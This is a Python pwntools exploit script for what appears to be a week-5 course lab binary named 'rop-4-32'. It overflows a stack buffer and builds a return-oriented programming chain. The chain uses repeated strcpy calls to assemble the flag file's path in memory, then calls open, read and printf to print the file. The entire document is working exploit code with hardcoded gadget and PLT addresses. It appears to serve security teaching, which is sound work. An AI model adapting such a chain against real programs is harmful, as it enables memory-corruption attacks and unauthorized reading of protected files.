#!/usr/bin/env python
from pwn import *

p = process("./rop-4-32")

'''
0x080483a9 : pop ebx ; ret
0x080486d3 : pop ecx ; pop ebx ; pop ebp ; lea esp, [ecx - 4] ; ret
0x0804873a : pop edi ; pop ebp ; ret
0x08048739 : pop esi ; pop edi ; pop ebp ; ret
'''

'''
0x080483c0  read@plt
0x080483d0  printf@plt
0x080483e0  chdir@plt
0x080483f0  puts@plt
0x08048400  open@plt
0x0804858e  strcpy
'''

buf = "A" * 0x88 + "BBBB"

openfile = 0x08048400
readfile = 0x080483c0
printffile = 0x080483d0
strcpychar = 0x0804858e
pop_ebx_ret = 0x080483a9
pop_edi_pop_ebp_ret = 0x0804873a
pop_esi_pop_edi_pop_edp_ret = 0x08048739
store_addr = 0x804a800

# /home/labs/week5/rop-4-32/flag

buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr) + p32(0x80487e0)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+1) + p32(0x8048769)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+2) + p32(0x8048774)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+3) + p32(0x804877e)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+4) + p32(0x804876a)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+5) + p32(0x80487e0)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+6) + p32(0x804878b)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+7) + p32(0x804878c)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+8) + p32(0x8048772)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+9) + p32(0x8048780)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+10) + p32(0x80487e0)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+11) + p32(0x8048775)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+12) + p32(0x804876a)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+13) + p32(0x804876a)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+14) + p32(0x8048770)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+15) + p32(0x80487b5)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+16) + p32(0x80487e0)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+17) + p32(0x8048773)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+18) + p32(0x8048774)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+19) + p32(0x804879f)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+20) + p32(0x80487bb)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+21) + p32(0x80487b4)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+22) + p32(0x80487bb)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+23) + p32(0x80487b3)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+24) + p32(0x80487b2)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+25) + p32(0x80487e0)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+26) + p32(0x80487a8)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+27) + p32(0x804878b)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+28) + p32(0x804878c)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+29) + p32(0x8048792)
buf += p32(strcpychar) + p32(pop_edi_pop_ebp_ret) + p32(store_addr+30) + p32(0x8048794)
buf += p32(openfile) + p32(pop_edi_pop_ebp_ret) + p32(store_addr) + p32(0)
buf += p32(readfile) + p32(pop_esi_pop_edi_pop_edp_ret) + p32(3) + p32(store_addr) + p32(100)
buf += p32(printffile) + p32(pop_ebx_ret) + p32(store_addr)

with open('test','wb')as f:
      f.write(buf);

p.sendline(buf)
p.interactive()
